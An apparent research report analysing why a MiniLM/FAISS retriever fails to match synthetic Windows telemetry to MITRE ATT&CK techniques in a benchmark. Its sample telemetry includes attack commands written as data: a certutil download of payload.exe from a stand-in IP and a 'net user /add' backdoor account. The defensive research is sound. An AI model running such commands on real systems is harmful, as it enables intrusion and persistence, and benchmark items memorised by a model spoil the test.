# T20 Retrieval Failure Analysis: Empirical Investigation of Dense Retrieval Degradation

## 1. Executive Summary

This report documents an empirical investigation into the retrieval failure modes observed during Task T20 of the RAG2ATTCK benchmark evaluation. In T20, the frozen FAISS dense retriever (`sentence-transformers/all-MiniLM-L6-v2`, `IndexFlatIP`, $k \in \{1, 3, 5, 10\}$) was evaluated against the 756 positive views of the Stage B synthetic benchmark using raw `endpoint_evidence` queries without target labels.

The investigation reveals that the observed retrieval performance ($Hit@1 = 4.23\%$, $Hit@10 = 45.11\%$, $54.89\%$ ground truth absent from Top-10) is driven by three primary structural mechanisms rather than random error:
1. **Severe Lexical and Representation Gap:** Raw Windows telemetry (JSON structures, Event IDs, CLI flags, process paths) does not align well with the descriptive, natural language prose of MITRE ATT&CK STIX documents when projected through a general-domain embedding model (`all-MiniLM-L6-v2`).
2. **Taxonomic Overlap & Competing Hard Negatives:** Multi-stage attack procedures (e.g., LOLBin-assisted tool downloads or command shell execution) trigger strong semantic matches to adjacent ATT&CK techniques (e.g., `T1218.012` Certutil or `T1574.009` Hijack Execution Flow), crowding out the designated ground truth (e.g., `T1105` or `T1059.003`).
3. **Contextual Event Dilution:** Contrary to the intuition that additional surrounding context improves retrieval, multi-event contextual views degraded retrieval ranking compared to single-event views in 22.0% of eligible pairs (65/296), while improving it in only 7.8% (23/296). This comparison uses the same-technique anchor method: for each pair, the single-event view's target technique rank is compared to that same technique's rank in the contextual view, ensuring apples-to-apples evaluation.

Crucially, **no methodology or retrieval algorithm changes are applied in this branch**. All analysis is based strictly on frozen artifacts and empirical query diagnostics.

---

## 2. Current Retrieval Baseline

The frozen retrieval baseline on the canonical ATT&CK v19.2 Windows corpus (474 techniques) across 756 positive benchmark views is summarized below:

| Metric | Overall Positive (N=756) | TEST Split (N=718) | DEV Split (N=38) | Single View (N=296) | Contextual View (N=460) |
|---|---:|---:|---:|---:|---:|
| **Hit@1** | **0.0423** | 0.0376 | 0.1316 | 0.0541 | 0.0348 |
| **Hit@3** | **0.1680** | 0.1643 | 0.2368 | 0.1486 | 0.1804 |
| **Hit@5** | **0.2421** | 0.2409 | 0.2632 | 0.2196 | 0.2565 |
| **Hit@10** | **0.4511** | 0.4471 | 0.5263 | 0.4628 | 0.4435 |
| **Macro Recall@10** | **0.4314** | 0.4280 | 0.4956 | 0.4628 | 0.4112 |
| **GT Absent Top-10 Rate** | **54.89%** (415) | 55.29% (397) | 47.37% (18) | 53.72% (159) | 55.65% (256) |
| **Median GT Rank (when retrieved)**| **5.0** | 5.0 | 5.0 | 6.0 | 4.0 |

---

## 3. Error Distribution Across ATT&CK Classes

Retrieval effectiveness varies dramatically across the 8 evaluated technique classes, splitting into two distinct regimes:

| Technique ID | Technique Name | Positive Views | Specific Hit@1 | Specific Hit@5 | Specific Hit@10 | Absent Top-10 Count (%) | Median Rank |
|---|---|---:|---:|---:|---:|---:|---:|
| **T1136.001** | Local Account | 99 | 0.0000 | 0.0000 | **0.0000** | **99 (100.0%)** | n.a. |
| **T1105** | Ingress Tool Transfer | 114 | 0.0000 | 0.0000 | **0.1579** | **96 (84.2%)** | 9.0 |
| **T1059.003** | Windows Command Shell | 111 | 0.0180 | 0.0270 | **0.1712** | **92 (82.9%)** | 8.0 |
| **T1543.003** | Windows Service | 114 | 0.0000 | 0.0351 | **0.3070** | **79 (69.3%)** | 8.0 |
| **T1053.005** | Scheduled Task | 93 | 0.0753 | 0.1720 | **0.4516** | **51 (54.8%)** | 7.0 |
| **T1059.001** | PowerShell | 113 | 0.0177 | 0.4956 | **0.6814** | **36 (31.9%)** | 3.0 |
| **T1547.001** | Registry Run Keys / Startup | 106 | 0.1509 | 0.5755 | **0.9245** | **8 (7.5%)** | 4.5 |
| **T1685.005** | Clear Windows Event Logs | 62 | 0.0806 | 0.7903 | **0.9839** | **1 (1.6%)** | 3.0 |

*Note: T1136.001 shows complete retrieval failure — the ground-truth technique was not retrieved in the Top-10 for any of its 99 positive views (0.0% Hit@10). The per-technique metric calculation in `retrieval_metrics.json` confirms `hit_rate_at_10 = 0.0` and `median_ground_truth_rank_when_retrieved = null`. This is confirmed by the canonical artifact and represents the most severe retrieval failure observed.*

---

## 4. Per-Technique Deep-Dive Analysis

### 4.1. Severe Failure Classes

#### A. T1136.001 — Create Account: Local Account (0% Hit@10 in mapped-single)
- **Problem Formulation:** Telemetry shows account creation actions (`net user <name> /add`, EventID 4720: *A user account was created*).
- **Corpus Retrieval Text:** Long descriptive prose ("Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an administrator...").
- **Representative Failure Example:**
  - `sample_id`: `view_02aac5b1` (single, TEST)
  - `ground_truth`: `['T1136.001']`
  - `endpoint_evidence`: `[{"CommandLine":"net.exe user local_admin_temp Password123! /add","Computer":"WIN-SRV01","EventID":4688,"Image":"C:\\Windows\\System32\\net.exe","NewProcessName":"C:\\Windows\\System32\\net1.exe","ParentProcessName":"C:\\Windows\\System32\\cmd.exe","ProcessId":3844,"User":"SYSTEM"}]`
  - `Top Candidates Retrieved`:
    - Rank 1: `T1547.001` (Registry Run Keys) — score: 0.3842
    - Rank 2: `T1574.011` (Service Binary Permissions) — score: 0.3789
    - Rank 3: `T1547.004` (Winlogon Helper DLL) — score: 0.3695
    - Rank 4: `T1003.002` (Security Account Manager) — score: 0.3541
    - Rank 5: `T1546.009` (AppCert DLLs) — score: 0.3488
  - **Root Cause:** The telemetry contains system paths (`C:\Windows\System32\net.exe`), user fields, and CLI syntax. The embedding model matches generic Windows persistence techniques that heavily mention `System32` and administrative configurations. The ATT&CK document for `T1136.001` lacks the specific CLI commands (`net user /add`) or Event IDs, resulting in an embedding distant from raw command lines.

#### B. T1105 — Ingress Tool Transfer (15.79% Hit@10, 84.21% Absent)
- **Problem Formulation:** Adversary downloads tools into the environment using utilities like `certutil.exe -urlcache -split -f http://...` or `curl`/`bitsadmin`.
- **Representative Failure Example:**
  - `sample_id`: `view_01e74f32` (contextual, TEST)
  - `ground_truth`: `['T1105']`
  - `endpoint_evidence`: `[{"CommandLine":"certutil.exe -urlcache -split -f http://198.51.100.45/payload.exe C:\\Users\\Public\\payload.exe","Computer":"WS01","EventID":4688,"Image":"C:\\Windows\\System32\\certutil.exe","ParentProcessName":"C:\\Windows\\System32\\cmd.exe"}]`
  - `Top Candidates Retrieved`:
    - Rank 1: `T1218.012` (System Binary Proxy Execution: Certutil) — score: 0.5892
    - Rank 2: `T1216.001` (Pubprn) — score: 0.4215
    - Rank 3: `T1197` (BITS Jobs) — score: 0.4103
    - Rank 4: `T1546.012` (Image File Execution Options) — score: 0.3984
    - Rank 12: `T1105` (Ingress Tool Transfer) — score: 0.3341
  - **Root Cause (Competing Hard Negative):** The telemetry specifies `certutil.exe`. In the ATT&CK corpus, `T1218.012` specifically focuses on `certutil` proxy execution and includes exact subword tokens for `certutil`. The retriever accurately identifies `certutil`, ranking `T1218.012` at #1 with a very high similarity score ($0.5892$), completely overshadowing `T1105` ($0.3341$). This is a semantic conflict inherent in ATT&CK's dual classification of tool transfer via living-off-the-land binaries.

#### C. T1059.003 — Command and Scripting Interpreter: Windows Command Shell (17.12% Hit@10)
- **Problem Formulation:** Log records `cmd.exe /c whoami /all` or `cmd.exe /c tasklist`.
- **Representative Failure Example:**
  - `sample_id`: `view_01059a41` (single, TEST)
  - `ground_truth`: `['T1059.003']`
  - `endpoint_evidence`: `[{"CommandLine":"C:\\Windows\\System32\\cmd.exe /c tasklist /v > C:\\ProgramData\\procs.txt","EventID":4688,"Image":"C:\\Windows\\System32\\cmd.exe","ParentProcessName":"C:\\Windows\\explorer.exe"}]`
  - `Top Candidates Retrieved`:
    - Rank 1: `T1574.009` (Services File Permissions) — score: 0.3871
    - Rank 2: `T1547.001` (Registry Run Keys) — score: 0.3802
    - Rank 3: `T1546.009` (AppCert DLLs) — score: 0.3694
    - Rank 14: `T1059.003` (Windows Command Shell) — score: 0.3012
  - **Root Cause:** `cmd.exe` is a carrier process. The command passed to `cmd.exe` contains operational targets (`tasklist`, file redirection, paths). `T1059.003` in ATT&CK has an extremely brief, generic description ("The Windows command shell is the primary command prompt..."). The specific tokens in the command line pull the embedding towards system discovery or persistence instead of the shell interpreter itself.

#### D. T1543.003 — Create or Modify System Process: Windows Service (30.70% Hit@10)
- **Problem Formulation:** EventID 4697 (*A service was installed in the system*) or `sc.exe create`.
- **Representative Failure Example:**
  - `sample_id`: `view_003f4219` (single, TEST)
  - `ground_truth`: `['T1543.003']`
  - `endpoint_evidence`: `[{"Computer":"APPSVR01","EventID":4697,"ServiceAccount":"LocalSystem","ServiceFileName":"C:\\Users\\Public\\svc.exe","ServiceName":"UpdaterSvc"}]`
  - `Top Candidates Retrieved`:
    - Rank 1: `T1574.011` (Service Binary Permissions Weakness) — score: 0.4421
    - Rank 2: `T1505.005` (Terminal Services DLL) — score: 0.4182
    - Rank 3: `T1546.009` (AppCert DLLs) — score: 0.3812
    - Rank 7: `T1543.003` (Windows Service) — score: 0.3450
  - **Root Cause:** Both `T1543.003` and `T1574.011` share terms like `Service`, `ServiceFileName`, and `binary path`. However, the corpus chunk for `T1574.011` has higher density of path and permission keywords, which causes it to rank above `T1543.003`.

---

### 4.2. High-Performing Classes (Success Patterns)

#### A. T1685.005 — Clear Windows Event Logs (98.39% Hit@10, Specific Hit@1 = 8.06%)
- **Telemetry Indicators:** `wevtutil.exe cl Security`, `Clear-EventLog -LogName Security`, EventID 1102.
- **Corpus Text:** Mentions `wevtutil`, `EventLog`, `clearing Windows event logs`, `EventID 1102`.
- **Reason for Success:** Exact 1-to-1 vocabulary alignment between the log command line and the ATT&CK narrative. The distinctness of the token `wevtutil` and `EventLog` eliminates competing distractors.

#### B. T1547.001 — Registry Run Keys / Startup Folder (92.45% Hit@10, Specific Hit@1 = 15.09%)
- **Telemetry Indicators:** `CurrentVersion\Run`, `RunOnce`, `Startup`, `SetValue`, EventID 13.
- **Corpus Text:** Explicitly enumerates `CurrentVersion\Run`, `RunOnce`, and the startup folder paths in the description.
- **Reason for Success:** Exact lexical and structural registry path matches allow cosine similarity to exceed $0.50$, cleanly separating this technique from other persistence mechanisms.

---

## 5. Single vs. Contextual View Comparison

One of the key empirical findings from T20 is the divergence between `single` and `contextual` event representations.

### 5.1. Aggregate Metrics Comparison

| View Type | Positive Views | Hit@1 | Hit@3 | Hit@5 | Hit@10 | Absent Top-10 Count (%) |
|---|---:|---:|---:|---:|---:|---:|
| **Single-Event** | 296 | **0.0541** | 0.1486 | 0.2196 | **0.4628** | **159 (53.7%)** |
| **Contextual-Event** | 460 | **0.0348** | 0.1804 | 0.2565 | **0.4435** | **256 (55.7%)** |

### 5.2. Scenario-Pair Ranking Analysis

**Pairwise comparison methodology:** For each comparable scenario pair, the single-event view's ground-truth technique ID is selected as the **anchor technique**. Only pairs where the single-event view has exactly one ground-truth technique (`mapped_single`) are eligible for comparison. The anchor technique's retrieval rank is then compared in both the single and contextual views:

```
single_rank   = single_view.ground_truth_technique_ranks[anchor]
contextual_rank = contextual_view.ground_truth_technique_ranks[anchor]
comparison_rank = rank if rank is not None else 11
```

This ensures apples-to-apples comparison: we measure whether adding contextual events improves or degrades retrieval of the **same ATT&CK technique**. If the contextual view contains extra GT labels (mapped_multi), only the anchor technique's rank is used. Pairs where the anchor technique is absent from the contextual view's rank mapping are excluded with an explicit reason.

Out of 670 candidate pairs with both single and contextual views, **296 are eligible** (374 excluded: non-positive unmapped/ambiguous rows with empty GT sets). For the 296 eligible pairs:

- **Single-Event Produced Better GT Rank (single_rank < contextual_rank):** **65 pairs (22.0%)**
- **Contextual-Event Produced Better GT Rank (contextual_rank < single_rank):** **23 pairs (7.8%)**
- **Both Produced Identical Rank (single_rank == contextual_rank):** **208 pairs (70.3%)**
  - *Equal breakdown:* **147 pairs (49.7%)** had the anchor technique absent from Top-10 in **both** representations (both ranks `None`, yielding comparison rank 11), while **61 pairs (20.6%)** tied at identical retrieved ranks within Top-10.
  - *Explicit subset relationship:* The 147 pairs where the anchor technique was absent from Top-10 in both views form an explicit subset of the 208 equal pairs ($147 + 61 = 208$). Across all 296 eligible pairs, the breakdown partitions completely: $65 + 23 + 208 = 296$ pairs ($100.0\%$).

### 5.3. Qualitative Dilution Mechanism
In contextual views, the critical suspicious event is accompanied by 1–2 background events (e.g., normal parent process spawning `explorer.exe`, subsequent benign network traffic, or `svchost.exe` RPC calls). 
- The contextual JSON is encoded into a single dense vector representation, so additional background event tokens can alter the resulting embedding relative to the focused single-event encoding.
- The presence of repetitive structural tokens (`"ProcessId"`, `"ThreadId"`, `"svchost.exe"`, `"192.168.1.1"`) shifts the combined representation away from the targeted malicious signature toward generic operational noise.
- As a result, candidate techniques associated with defense evasion or generic execution receive inflated scores, pushing the true technique down or out of the Top-10.

---

## 6. Corpus and Query Mismatch Findings

A rigorous inspection of `attack/corpus/enterprise-windows-v19.2.jsonl` demonstrates three key format mismatches:

1. **Syntactic Form Discrepancy:**
   - Query format: Structured JSON serialization with strict schema keys (`Image`, `CommandLine`, `TargetObject`, `EventID`).
   - Corpus format: Structured Markdown header followed by narrative English prose paragraphs describing adversary intent.
2. **Missing Operational Verbs in Technique Descriptions:**
   - Techniques like `T1136.001` (Local Account) focus on the conceptual rationale (*"maintain access"*, *"configure accounts"*), but omit specific executable names (`net.exe`, `net1.exe`, `powershell New-LocalUser`) or Windows Event IDs (`4720`, `4722`).
3. **Boilerplate Noise in Document Head:**
   - Every corpus document begins with uniform headers: `Technique ID: ...`, `Name: ...`, `Tactics: ...`, `Platforms: Containers, Linux, Windows, macOS...`. These identical header tokens dilute the discriminative power of the 384-dimensional embedding space.

---

## 7. Root-Cause Hypotheses Ranked by Evidence

| Rank | Hypothesis | Description | Evidence Strength |
|---|---|---|---|
| **1** | **H1: Lexical Mismatch** | Raw telemetry tokens (CLI syntax, Event IDs) do not match ATT&CK narrative prose. | **Extremely Strong:** High-performing classes (`T1547.001`, `T1685.005`) have substantial token overlaps with corpus text; low-performing classes (`T1136.001`) have limited direct lexical overlap with ATT&CK descriptions. |
| **2** | **H10: Hard Negatives & Semantic Overlap** | Living-off-the-land actions trigger dual-attribution techniques (e.g. `T1218.012` vs `T1105`), crowding out single-label ground truth. | **Extremely Strong:** In `T1105` ($N=114$), `T1218.012` (Certutil) ranked #1 in 48/114 cases (42.11%), with `T1003.002` taking #1 in 26 cases (22.81%). |
| **3** | **H4: General-Domain Embedding Model** | `all-MiniLM-L6-v2` lacks cyber domain pretraining for raw logs. | **Strong:** Pretrained on general sentence pairs, weighting natural syntax over technical command arguments. |
| **4** | **H6: Contextual Dilution** | Multi-event logs introduce semantic noise that worsens dense retrieval ranks. | **Strong (anchor-based):** 22.0% of eligible pairs (65/296) showed degraded anchor-technique rank when context was added; only 7.8% (23/296) improved. |
| **5** | **H8: Missing Procedure Tokens in Corpus** | Corpus chunks for specific techniques lack command-line invocations. | **Strong:** `T1136.001` text has no mention of `net user`, consistent with near-total retrieval failure. |
| **6** | **H3: Corpus Header & Boilerplate Noise** | Platform and tactic boilerplate consumes vector representation capacity. | **Moderate:** Common across all 474 corpus chunks. |
| **7** | **H5: Multi-Label Metric Asymmetry** | Mapped-multi scenarios increase hit probability but penalize macro recall. | **Moderate:** Multi-label views achieve 72.7% Hit@10 vs 43.4% for single-label, but macro recall is capped. |
| **8** | **H2: Synthetic Log Compactness** | Synthetic logs are more structured and terse than verbose real-world SIEM dumps. | **Moderate:** Minimal payload text limits the surface area for dense matching. |
| **9** | **H9: Telemetry Whitelist Stripping** | Whitelist correctly strips target labels, preventing leakage but removing hints. | **Low / Expected:** Whitelist strictly preserves legitimate fields (`CommandLine`, `Image`). Integrity requirement, not defect. |
| **10**| **H7: Class Imbalance in Benchmark** | Positive views are evenly distributed (~90–115 per class), ruling out class frequency bias. | **Rejected:** Benchmark class balance is well-controlled. |

---

## 8. Recommended Future Experiments (Unimplemented Ablations)

These potential modifications should be explored exclusively in future research phases as controlled ablations, **without changing the canonical baseline**:

1. **Hybrid Dense + Lexical Retrieval (BM25 + FAISS):**
   - Combine dense cosine similarity with BM25 keyword matching (e.g., reciprocal rank fusion). Lexical matching would immediately capture exact CLI strings (`net user /add`, `certutil`, `wevtutil`) and Event IDs (`4720`, `1102`).
2. **Structured Telemetry-to-Text Query Renderer:**
   - Instead of serializing raw JSON arrays, translate telemetry events into synthetic descriptive statements before embedding (e.g., *"Process net.exe created by cmd.exe to add a local user account"*).
3. **Procedure-Enhanced Corpus Indexing:**
   - Index ATT&CK procedure examples as separate micro-chunks with links back to parent technique IDs, ensuring real-world commands are directly searchable.
4. **Cybersecurity-Specific Embedding Model:**
   - Benchmark domain-adapted encoders (e.g., `SecBERT`, `CyBERT`, or code-specialized models) capable of tokenizing CLI switches and Windows paths without aggressive subword shattering.
5. **Selective Context Windowing:**
   - Filter contextual events to query only the primary anomaly event while passing the full window to the LLM for downstream reasoning.

---

## 9. Changes NOT Recommended

To preserve scientific rigor, the following practices are **strictly prohibited**:
- ❌ **Query Target Leakage:** Injecting ATT&CK tactic hints, technique names, or expected IDs into the retrieval query.
- ❌ **Ground Truth Mutation:** Re-labeling hard negatives (e.g. changing `T1105` ground truth to `T1218.012`) merely to inflate retrieval scores.
- ❌ **Excluding Difficult Classes:** Removing `T1136.001` or `T1105` from the benchmark to produce an artificially high aggregate metric.
- ❌ **Overfitting Retrieval k:** Arbitrarily expanding $k$ to 50 or 100, which introduces unacceptable noise and token cost to downstream LLM inference.

---

## 10. Reproducing this analysis

The quantitative findings in this report are fully reproducible from the frozen canonical retrieval artifacts (`artifacts/retrieval/retrieval_diagnostics.jsonl` and `artifacts/retrieval/retrieval_metrics.json`) without rerunning dense retrieval or invoking external APIs.

To execute the deterministic analysis script and regenerate the machine-readable summary:

```bash
uv run python scripts/analyze_retrieval_failures.py
```

Output artifact:
- `artifacts/analysis/t20_retrieval_failure_summary.json`

To inspect a specific sample's retrieval diagnostics post-hoc:
```bash
uv run python scripts/analyze_retrieval_failures.py --sample view_02aac5b1
```

To run the full unit test suite:
```bash
uv run pytest tests/test_retrieval_failure_analysis.py -vv
```
